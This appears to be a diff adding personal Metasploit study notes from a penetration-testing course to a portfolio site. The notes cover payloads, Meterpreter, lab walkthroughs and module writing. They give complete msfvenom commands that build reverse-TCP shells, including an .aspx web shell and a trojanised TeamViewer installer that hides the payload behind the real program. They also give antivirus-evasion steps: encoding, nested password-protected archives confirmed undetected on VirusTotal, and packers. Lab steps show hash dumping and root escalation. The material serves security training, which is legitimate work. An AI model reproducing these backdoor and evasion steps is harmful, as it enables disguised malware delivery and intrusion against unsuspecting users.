+<p>Default payload: <code>reverse_tcp_shell</code></p>
+<p>A <code>Single</code> payload contains the exploit and the entire shellcode for the selected task.</p>
+<ul>
+<li>more stable cuz contains everything all-in-one</li>
+<li>gets us a result immediately after running</li>
+</ul>
+<p>A <code>Stager</code> payload works with Stage payload.</p>
+<ul>
+<li>waits on attacker machine</li>
+<li>establish connection to the victim host</li>
+</ul>
+<p>A <code>Stage</code> is a payload component that are downloaded by a stager’s modules. Payload stages automatically use middle stagers:</p>
+<ul>
+<li>a single <code>recv()</code> fails with large payloads</li>
+<li>the stager receives the middle stager</li>
+<li>the middle stager then performs a full download</li>
+<li>also better for <code>RWX</code></li>
+</ul>
+<div class="callout callout-cyan">
+  <div class="callout-title">
+    <span class="callout-icon">ℹ️</span>
+    <span class="callout-title-text">Info</span>
+  </div>
+  <div class="callout-content">
+<p><code>Stage0</code> of a staged payload represents the initial shellcode sent over the network to the target machine’s vulnerable service</p>
+</div></div>
+<p>The <code>Meterpreter</code> payload is a specific type of multi-faceted payload that uses <code>DLL injection</code> to ensure the connection to the victim host is stable.</p>
+<ul>
+<li>resides completely in the memory of the remote host</li>
+<li>leaves no traces on the hard drive</li>
+<li>difficult to detect with conventional forensic techniques</li>
+<li>scripts and plugins can be loaded and unloaded dynamically as required</li>
+</ul>
+<div class="callout callout-green callout-collapsible" data-expanded="true">
+  <div class="callout-title">
+    <span class="callout-icon">💡</span>
+    <span class="callout-title-text">Selecting payloads</span>
+    <svg class="callout-toggle" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <polyline points="6 9 12 15 18 9"></polyline>
+    </svg>
+  </div>
+  <div class="callout-content">
+<ul>
+<li>if you want access persistence, search for <strong>meterpreter</strong> payloads
+<ul>
+<li><a href="https://github.com/gentilkiwi/mimikatz">GentilKiwi’s Mimikatz Plugin</a></li>
+<li><code>grep meterpreter grep reverse_tcp show payloads</code></li>
+<li>show count: <code>grep -c meterpreter show payloads</code></li>
+</ul>
+</li>
+<li><code>set payload &#x3C;no.></code></li>
+</ul>
+</div></div>
+<p>A <strong>channel</strong> in a meterpreter represents the connection between our device and the target host, which has been established in a reverse TCP connection using a Meterpreter Stager and Stage
+<img alt="msf3" loading="lazy" decoding="async" fetchpriority="auto" width="891" height="605" src="/cyberportfolio/_astro/msf3.B8gTY4zp_Z1WKsMY.webp" ></p>
+<ol>
+<li>Apache Druid 0.20.0 is vulnerable to <strong>Remote Command Execution</strong> (RCE)
+<ul>
+<li><a href="https://www.rapid7.com/db/modules/exploit/linux/http/apache_druid_js_rce/">check this out</a></li>
+</ul>
+</li>
+<li><code>search apache druid</code></li>
+<li><code>use exploit/linux/http/apache_druid_js_rce</code></li>
+<li>set RHOST, LHOST</li>
+<li>run</li>
+<li><code>search -f flag.txt</code></li>
+<li><code>cat &#x3C;file></code></li>
+</ol>
+<h2 id="encoders">Encoders</h2>
+<p>Encoders make payloads compatible with different processor architectures and help with antivirus evasion.</p>
+<ul>
+<li>remove hexadecimal opcodes known as bad characters</li>
+<li>architectures include: <code>x64</code>, <code>x86</code>, <code>sparc</code>, <code>ppc</code>, <code>mips</code></li>
+</ul>
+<p>Payload with encoding</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">msfvenom</span><span style="color:#79B8FF"> -a</span><span style="color:#9ECBFF"> x86</span><span style="color:#79B8FF"> --platform</span><span style="color:#9ECBFF"> windows</span><span style="color:#79B8FF"> -p</span><span style="color:#9ECBFF"> windows/shell/reverse_tcp</span><span style="color:#9ECBFF"> LHOST=</span><span style="color:#79B8FF">127.0.0.1</span><span style="color:#9ECBFF"> LPORT=</span><span style="color:#79B8FF">4444</span><span style="color:#79B8FF"> -b</span><span style="color:#9ECBFF"> "\x00"</span><span style="color:#79B8FF"> -f</span><span style="color:#9ECBFF"> perl</span><span style="color:#79B8FF"> -e</span><span style="color:#9ECBFF"> x86/shikata_ga_nai</span></span></code></pre>
+<p>Generating payloads</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">msfvenom</span><span style="color:#79B8FF"> -a</span><span style="color:#9ECBFF"> x86</span><span style="color:#79B8FF"> --platform</span><span style="color:#9ECBFF"> windows</span><span style="color:#79B8FF"> -p</span><span style="color:#9ECBFF"> windows/meterpreter/reverse_tcp</span><span style="color:#9ECBFF"> LHOST=</span><span style="color:#79B8FF">10.10.14.5</span><span style="color:#9ECBFF"> LPORT=</span><span style="color:#79B8FF">8080</span><span style="color:#79B8FF"> -e</span><span style="color:#9ECBFF"> x86/shikata_ga_nai</span><span style="color:#79B8FF"> -f</span><span style="color:#9ECBFF"> exe</span><span style="color:#79B8FF"> -o</span><span style="color:#9ECBFF"> ./TeamViewerInstall.exe</span></span></code></pre>
+<p>Analyse payloads (require free registration on VirusTotal)</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">msf-virustotal</span><span style="color:#79B8FF"> -k</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">API</span><span style="color:#9ECBFF"> ke</span><span style="color:#E1E4E8">y</span><span style="color:#F97583">></span><span style="color:#79B8FF"> -f</span><span style="color:#9ECBFF"> TeamViewerInstall.exe</span></span></code></pre>
+<h2 id="databases">Databases</h2>
+<p>keep track of your results</p>
+<p>ensure PostgreSQL server is up</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> service</span><span style="color:#9ECBFF"> postgresql</span><span style="color:#9ECBFF"> status</span></span></code></pre>
+<p>start server</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> systemctl</span><span style="color:#9ECBFF"> start</span><span style="color:#9ECBFF"> postgresql</span></span></code></pre>
+<p>initiate database</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> msfdb</span><span style="color:#9ECBFF"> init</span></span></code></pre>
+<p>connect to database</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> msfdb</span><span style="color:#9ECBFF"> run</span></span></code></pre>
+<p>organise workspace within msfconsole</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">workspace</span><span style="color:#79B8FF"> -a</span><span style="color:#9ECBFF"> target1</span></span></code></pre>
+<p>importing scan results</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">db_import</span><span style="color:#9ECBFF"> Target.xml</span></span></code></pre>
+<p>using nmap straight from msfconsole</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">db_nmap</span><span style="color:#79B8FF"> -sV</span><span style="color:#79B8FF"> -sS</span><span style="color:#79B8FF"> 10.10.10.8</span></span></code></pre>
+<p>data backup</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">db_export</span><span style="color:#79B8FF"> -h</span></span></code></pre>
+<p>hosts: database table automatically populated with the host addresses, hostnames and other information</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">hosts</span><span style="color:#79B8FF"> -h</span></span></code></pre>
+<p><code>services</code>: table with descriptions and information on services discovered during scans or interactions</p>
+<p><code>creds</code>: visualise the credentials gathered</p>
+<p><code>loot</code>: list of owned services and users</p>
+<ul>
+<li>hash dumps, passwd, etc.</li>
+</ul>
+<h2 id="plugins-and-mixins">Plugins and Mixins</h2>
+<p>default plugins directory</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">ls</span><span style="color:#9ECBFF"> /usr/share/metasploit-framework/plugins</span></span></code></pre>
+<p>load plugins</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">load</span><span style="color:#9ECBFF"> plugin1</span></span></code></pre>
+<p><strong>Mixins</strong> are classes that act as methods for use by other classes without having to be the parent class of those other classes.</p>
+<h2 id="sessions-and-jobs">Sessions and Jobs</h2>
+<p>view active sessions</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sessions</span></span></code></pre>
+<p>interacting with a session</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sessions</span><span style="color:#79B8FF"> -i</span><span style="color:#E1E4E8"> [no.]</span></span></code></pre>
+<p>run exploit as a job</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">exploit</span><span style="color:#79B8FF"> -j</span></span></code></pre>
+<p><code>-l</code> - list all running jobs
+<code>-k</code> kill all running jobs</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79B8FF">jobs</span><span style="color:#79B8FF"> -l</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79B8FF">jobs</span><span style="color:#79B8FF"> -k</span></span></code></pre>
+<ol>
+<li>nmap target</li>
+<li><code>search linux/http</code>
+<ol>
+<li>found an “elfinder” vulnerability</li>
+</ol>
+</li>
+<li>set RHOST, LHOST</li>
+<li>run</li>
+<li><code>getuid</code></li>
+<li><code>sysinfo</code> - if your meterpreter architecture does not match the architecture of target machine, rerun the exploit using the correct payload so that they match.</li>
+<li><code>shell</code> and check for sudo version with <code>sudo -V</code></li>
+<li><code>background</code> the current meterpreter session</li>
+<li><code>use post/multi/recon/local_exploit_suggester</code>, <code>run</code> to find the suitable exploits</li>
+<li>use <code>exploit/linux/local/sudo_baron_samedit</code></li>
+<li>configure all options</li>
+<li><code>run</code>. another session should be spawned</li>
+<li><code>whoami</code> to find out if you are root yet</li>
+</ol>
+<h2 id="meterpreter">Meterpreter</h2>
+<p><code>DLL injection</code> is used to ensure the connection to the victim host is stable and difficult to detect.</p>
+<ul>
+<li>The target executes initial stager</li>
+<li>stager loads the DLL prefixed with Reflective. Reflective stub handles the loading/injection of the DLL</li>
+<li>meterpreter core initialises and establishes an AES-encrypted link over the socket, and sends a GET. metasploit receives the GET and configures the client</li>
+<li>meterpreter loads extensions</li>
+</ul>
+<p>no idea what this is for</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">lsa_dump_sam</span></span></code></pre>
+<ol>
+<li><code>nmap</code> the target</li>
+<li>the website runs at port 5000, fortilogger</li>
+<li><code>search fortilogger</code></li>
+<li>run exploit, <code>getuid</code></li>
+<li><code>hashdump</code></li>
+</ol>
+<h2 id="writing-and-importing-modules">Writing and Importing Modules</h2>
+<div class="callout callout-green callout-collapsible" data-expanded="true">
+  <div class="callout-title">
+    <span class="callout-icon">✅</span>
+    <span class="callout-title-text">Finding and downloading modules</span>
+    <svg class="callout-toggle" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <polyline points="6 9 12 15 18 9"></polyline>
+    </svg>
+  </div>
+  <div class="callout-content">
+<ul>
+<li><strong>ExploitDB:</strong> Search the database using the tag <strong>“Metasploit Framework (MSF)”</strong> to find scripts pre-formatted for Metasploit</li>
+<li><strong>Searchsploit:</strong> Use the command line tool to find Ruby scripts (<code>.rb</code>), filtering out incompatible Python scripts.</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">searchsploit</span><span style="color:#79B8FF"> -t</span><span style="color:#9ECBFF"> Nagios3</span><span style="color:#79B8FF"> --exclude=</span><span style="color:#9ECBFF">".py"</span></span></code></pre>
+</div></div>
+<div class="callout callout-gray callout-collapsible" data-expanded="true">
+  <div class="callout-title">
+    <span class="callout-icon">📌</span>
+    <span class="callout-title-text">Directory Structure &#x26; Naming</span>
+    <svg class="callout-toggle" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <polyline points="6 9 12 15 18 9"></polyline>
+    </svg>
+  </div>
+  <div class="callout-content">
+<ul>
+<li><strong>Locations:</strong>
+<ul>
+<li><strong>System:</strong> <code>/usr/share/metasploit-framework/modules/</code></li>
+<li><strong>User (Local):</strong> <code>~/.msf4/modules/</code> (You may need to <code>mkdir</code> subfolders to match the system structure, e.g., <code>exploits/linux/http/</code>)</li>
+</ul>
+</li>
+<li><strong>Naming Convention:</strong> Use <strong>snake_case</strong> only. Alphanumeric and underscores are allowed; hyphens are prohibited.
+<ul>
+<li><em>Good:</em> <code>nagios3_command_injection.rb</code></li>
+<li><em>Bad:</em> <code>nagios3-command-injection.rb</code></li>
+</ul>
+</li>
+</ul>
+</div></div>
+<div class="callout callout-green callout-collapsible" data-expanded="true">
+  <div class="callout-title">
+    <span class="callout-icon">💡</span>
+    <span class="callout-title-text">Loading External Modules</span>
+    <svg class="callout-toggle" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <polyline points="6 9 12 15 18 9"></polyline>
+    </svg>
+  </div>
+  <div class="callout-content">
+<ul>
+<li><strong>Launch with Path:</strong> Start the console pointing to your custom directory.</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">msfconsole</span><span style="color:#79B8FF"> -m</span><span style="color:#9ECBFF"> /usr/share/metasploit-framework/modules</span></span></code></pre>
+<ul>
+<li><strong>Runtime Loading:</strong> Use the <code>loadpath</code> command inside the console.</li>
+<li><strong>Reloading:</strong> If you add a file to the default directories while the console is open, run <code>reload_all</code> to refresh the database.</li>
+</ul>
+</div></div>
+<div class="callout callout-cyan callout-collapsible" data-expanded="true">
+  <div class="callout-title">
+    <span class="callout-icon">ℹ️</span>
+    <span class="callout-title-text">Porting and Writing Modules</span>
+    <svg class="callout-toggle" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <polyline points="6 9 12 15 18 9"></polyline>
+    </svg>
+  </div>
+  <div class="callout-content">
+<p><strong>The Boilerplate Strategy</strong></p>
+<ul>
+<li>Do not start from scratch. Find an existing module similar to your goal (e.g., another CMS exploit) and copy it as a template.</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">cp</span><span style="color:#9ECBFF"> /usr/share/.../existing_module.rb</span><span style="color:#9ECBFF"> /usr/share/.../new_custom_module.rb</span></span></code></pre>
+<p><strong>Required Code Sections</strong></p>
+<ul>
+<li><strong>Mixins:</strong> Include necessary libraries at the top of the file.</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="ruby"><code><span class="line"><span style="color:#F97583">class</span><span style="color:#B392F0"> MetasploitModule</span><span style="color:#E1E4E8"> &#x3C; </span><span style="color:#B392F0">Msf::Exploit::Remote</span></span>
+<span class="line"><span style="color:#F97583"> include</span><span style="color:#79B8FF"> Msf</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">Exploit</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">Remote</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">HttpClient</span><span style="color:#6A737D">  # For Web interactions</span></span>
+<span class="line"><span style="color:#F97583"> include</span><span style="color:#79B8FF"> Msf</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">Exploit</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">PhpEXE</span><span style="color:#6A737D">              # For PHP Payload generation</span></span>
+<span class="line"><span style="color:#F97583"> include</span><span style="color:#79B8FF"> Msf</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">Auxiliary</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">Report</span><span style="color:#6A737D">            # For DB reporting</span></span></code></pre>
+<ul>
+<li><strong>Metadata (Initialize):</strong> Define the module’s identity.</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="ruby"><code><span class="line"><span style="color:#F97583">def</span><span style="color:#B392F0"> initialize</span><span style="color:#E1E4E8">(info</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">{})</span></span>
+<span class="line"><span style="color:#F97583"> super</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">update_info</span><span style="color:#E1E4E8">(info,</span></span>
+<span class="line"><span style="color:#9ECBFF">   'Name'</span><span style="color:#E1E4E8">           => </span><span style="color:#9ECBFF">"Module Name Here"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">   'Description'</span><span style="color:#E1E4E8">    => </span><span style="color:#9ECBFF">%q{ Detailed description of the exploit. }</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">   'License'</span><span style="color:#E1E4E8">        => </span><span style="color:#79B8FF">MSF_LICENSE</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">   'Author'</span><span style="color:#E1E4E8">         => [ </span><span style="color:#9ECBFF">'Your Name'</span><span style="color:#E1E4E8"> ],</span></span>
+<span class="line"><span style="color:#9ECBFF">   'Platform'</span><span style="color:#E1E4E8">       => </span><span style="color:#9ECBFF">'php'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">   'Targets'</span><span style="color:#E1E4E8">        => [ [ </span><span style="color:#9ECBFF">'Target Software v1.0'</span><span style="color:#E1E4E8">, {} ] ],</span></span>
+<span class="line"><span style="color:#9ECBFF">   'DefaultTarget'</span><span style="color:#E1E4E8">  => </span><span style="color:#79B8FF">0</span></span>
+<span class="line"><span style="color:#E1E4E8"> ))</span></span></code></pre>
+<ul>
+<li><strong>Options:</strong> Register user inputs using <code>OptString</code> or <code>OptPath</code> (for files).</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="ruby"><code><span class="line"><span style="color:#B392F0">register_options</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#E1E4E8"> [</span></span>
+<span class="line"><span style="color:#79B8FF">   OptString</span><span style="color:#E1E4E8">.</span><span style="color:#F97583">new</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'TARGETURI'</span><span style="color:#E1E4E8">, [</span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'The base path'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'/'</span><span style="color:#E1E4E8">]),</span></span>
+<span class="line"><span style="color:#79B8FF">   OptPath</span><span style="color:#E1E4E8">.</span><span style="color:#F97583">new</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'PASSWORDS'</span><span style="color:#E1E4E8">, [ </span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'Wordlist path'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">     File</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">join</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">Msf</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">Config</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">data_directory</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"wordlists"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"passwords.txt"</span><span style="color:#E1E4E8">) ])</span></span>
+<span class="line"><span style="color:#E1E4E8"> ])</span></span></code></pre>
+<ul>
+<li><strong>Exploit Logic:</strong> Write the functions to execute the attack, such as handling CSRF tokens or brute-forcing.</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="ruby"><code><span class="line"><span style="color:#F97583">def</span><span style="color:#B392F0"> get_csrf</span><span style="color:#E1E4E8">(client, login_url)</span></span>
+<span class="line"><span style="color:#FFAB70"> res</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> client.</span><span style="color:#B392F0">get</span><span style="color:#E1E4E8">(login_url)</span></span>
+<span class="line"><span style="color:#6A737D"> # Regex to scrape the token</span></span>
+<span class="line"><span style="color:#FFAB70"> csrf_token</span><span style="color:#F97583"> =</span><span style="color:#DBEDFF"> /name="tokenCSRF".+?value="(.+?)"/</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">match</span><span style="color:#E1E4E8">(res.</span><span style="color:#B392F0">body</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">captures</span></span>
+<span class="line"><span style="color:#F97583">end</span></span></code></pre>
+</div></div>
+<h2 id="introduction-to-msfvenom">Introduction to MSFVenom</h2>
+<ul>
+<li><strong>Combination Tool:</strong> MSFVenom is the successor to MSFPayload and MSFEncode, combining payload generation and encoding into a single tool.</li>
+<li><strong>Purpose:</strong> It allows penetration testers to craft customizable payloads for specific architectures and Operating Systems while “cleaning up” shellcode (removing bad characters) to ensure stability.</li>
+<li><strong>AV Evasion:</strong> While it creates hard-to-detect payloads, modern heuristic analysis and deep packet inspection make evasion more difficult than in the past.</li>
+</ul>
+<div class="callout callout-green">
+  <div class="callout-title">
+    <span class="callout-icon">💡</span>
+    <span class="callout-title-text">Creating and Deploying Payloads (Scenario)</span>
+  </div>
+  <div class="callout-content">
+<ul>
+<li><strong>Reconnaissance:</strong> Scanning a target reveals an IIS web server linked to an FTP server allowing anonymous login. The presence of an <code>aspnet_client</code> directory indicates the server can run <code>.aspx</code> files.</li>
+<li><strong>Generation:</strong> Use MSFVenom to generate a reverse TCP shell in <code>.aspx</code> format:</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">msfvenom</span><span style="color:#79B8FF"> -p</span><span style="color:#9ECBFF"> windows/meterpreter/reverse_tcp</span><span style="color:#9ECBFF"> LHOST=</span><span style="color:#79B8FF">10.10.14.5</span></span>
+<span class="line"><span style="color:#E1E4E8">LPORT</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">1337</span><span style="color:#B392F0"> -f</span><span style="color:#9ECBFF"> aspx</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF"> reverse_shell.aspx</span></span></code></pre>
+<ul>
+<li><strong>Listener Setup:</strong> Before triggering the payload, start a listener in <code>msfconsole</code> to catch the connection:</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">use</span><span style="color:#9ECBFF"> multi/handler</span></span>
+<span class="line"><span style="color:#79B8FF">set</span><span style="color:#9ECBFF"> LHOST</span><span style="color:#79B8FF"> 10.10.14.5</span></span>
+<span class="line"><span style="color:#79B8FF">set</span><span style="color:#9ECBFF"> LPORT</span><span style="color:#79B8FF"> 1337</span></span>
+<span class="line"><span style="color:#B392F0">run</span></span></code></pre>
+<ul>
+<li><strong>Execution:</strong> Upload the file via FTP, then navigate to the file’s URL in a browser (<code>http://10.10.10.5/reverse_shell.aspx</code>) to trigger the payload and open a session.</li>
+</ul>
+</div></div>
+<h2 id="firewall-and-idsips-evasion">Firewall and IDS/IPS evasion</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th><strong>Security Policy</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>Signature-based Detection</code></td><td>The operation of packets in the network and comparison with pre-built and pre-ordained attack patterns known as signatures. Any 100% match against these signatures will generate alarms.</td></tr><tr><td><code>Heuristic / Statistical Anomaly Detection</code></td><td>Behavioral comparison against an established baseline included modus-operandi signatures for known APTs (Advanced Persistent Threats). The baseline will identify the norm for the network and what protocols are commonly used. Any deviation from the maximum threshold will generate alarms.</td></tr><tr><td><code>Stateful Protocol Analysis Detection</code></td><td>Recognizing the divergence of protocols stated by event comparison using pre-built profiles of generally accepted definitions of non-malicious activity.</td></tr><tr><td><code>Live-monitoring and Alerting (SOC-based)</code></td><td>A team of analysts in a dedicated, in-house, or leased SOC (Security Operations Center) use live-feed software to monitor network activity and intermediate alarming systems for any potential threats, either deciding themselves if the threat should be actioned upon or letting the automated mechanisms take action instead.</td></tr><tr><td><code>msfvenom</code> offers the option of using executable templates. this allows us to use some pre-set templates for executable file, inject our payload into them.</td><td></td></tr></tbody></table>
+<ul>
+<li>embed the shellcode into any installer, package, or program</li>
+<li>hide the shellcode deep within the legitimate code of the actual product</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">msfvenom</span><span style="color:#9ECBFF"> windows/x86/meterpreter_reverse_tcp</span><span style="color:#9ECBFF"> LHOST=</span><span style="color:#79B8FF">10.10.14.2</span><span style="color:#9ECBFF"> LPORT=</span><span style="color:#79B8FF">8080</span><span style="color:#79B8FF"> -k</span><span style="color:#79B8FF"> -x</span><span style="color:#9ECBFF"> ~/Downloads/TeamViewer_Setup.exe</span><span style="color:#79B8FF"> -e</span><span style="color:#9ECBFF"> x86/shikata_ga_nai</span><span style="color:#79B8FF"> -a</span><span style="color:#9ECBFF"> x86</span><span style="color:#79B8FF"> --platform</span><span style="color:#9ECBFF"> windows</span><span style="color:#79B8FF"> -o</span><span style="color:#9ECBFF"> ~/Desktop/TeamViewer_Setup.exe</span><span style="color:#79B8FF"> -i</span><span style="color:#79B8FF"> 5</span></span></code></pre>
+<div class="callout callout-gray callout-collapsible" data-expanded="false">
+  <div class="callout-title">
+    <span class="callout-icon">💬</span>
+    <span class="callout-title-text">what happens when the user launches app</span>
+    <svg class="callout-toggle" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <polyline points="6 9 12 15 18 9"></polyline>
+    </svg>
+  </div>
+  <div class="callout-content">
+<p>For the most part, when a target launches a backdoored executable, nothing will appear to happen, which can raise suspicions in some cases. To improve our chances, we need to trigger the continuation of the normal execution of the launched application while pulling the payload in a separate thread from the main application. We do so with the<code>-k</code> flag as it appears above. However, even with the <code>-k</code> flag running, the target will only notice the running backdoor if they launch the backdoored executable template from a CLI environment. If they do so, a separate window will pop up with the payload, which will not close until we finish running the payload session interaction on the target.</p>
+</div></div>
+<p>archiving a piece of information such as a file, folder, script, executable, picture, or document and placing a password on the archive bypasses a lot of common anti-virus signatures today</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">msfvenom</span><span style="color:#9ECBFF"> windows/x86/meterpreter_reverse_tcp</span><span style="color:#9ECBFF"> LHOST=</span><span style="color:#79B8FF">10.10.14.2</span><span style="color:#9ECBFF"> LPORT=</span><span style="color:#79B8FF">8080</span><span style="color:#79B8FF"> -k</span><span style="color:#79B8FF"> -e</span><span style="color:#9ECBFF"> x86/shikata_ga_nai</span><span style="color:#79B8FF"> -a</span><span style="color:#9ECBFF"> x86</span><span style="color:#79B8FF"> --platform</span><span style="color:#9ECBFF"> windows</span><span style="color:#79B8FF"> -o</span><span style="color:#9ECBFF"> ~/test.js</span><span style="color:#79B8FF"> -i</span><span style="color:#79B8FF"> 5</span></span></code></pre>
+<p>use virus-total to get a detection baseline</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">msf-virustotal</span><span style="color:#79B8FF"> -k</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">API</span><span style="color:#9ECBFF"> ke</span><span style="color:#E1E4E8">y</span><span style="color:#F97583">></span><span style="color:#79B8FF"> -f</span><span style="color:#9ECBFF"> test.js</span><span style="color:#E1E4E8"> </span></span></code></pre>
+<p>archive it 2 more times with added password + remove extension</p>
+<ul>
+<li>virustotal shows that no antivirus detected the malware</li>
+</ul>
+<p><code>packer</code> refers to the result of an executable compression process where the payload is packed together with an executable program and with the decompression of code in one single file</p>
+<ul>
+<li>the decompression code returns the backdoored executable to its og state</li>
+</ul>
+<p>learn more about <a href="https://jon.oberheide.org/files/woot09-polypack.pdf">packer</a></p>
